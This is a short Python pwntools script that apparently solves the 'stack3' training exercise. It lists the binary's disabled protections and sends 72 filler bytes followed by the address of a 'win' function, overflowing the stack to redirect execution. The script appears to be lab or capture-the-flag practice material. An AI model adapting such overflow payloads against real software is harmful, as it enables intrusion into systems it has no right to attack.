from pwn import *

# 1. info
context.log_level = 'debug'
e = ELF("../stack3")
"""
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
"""

# 2. connect
p = process("../stack3")

# 3. exploti
payload = b'b' * 72 + p64(e.symbols['win'])
p.sendline(payload)

message = p.recvline()
FLAG = b'code flow successfully changed'
if FLAG in message:
    print(FLAG)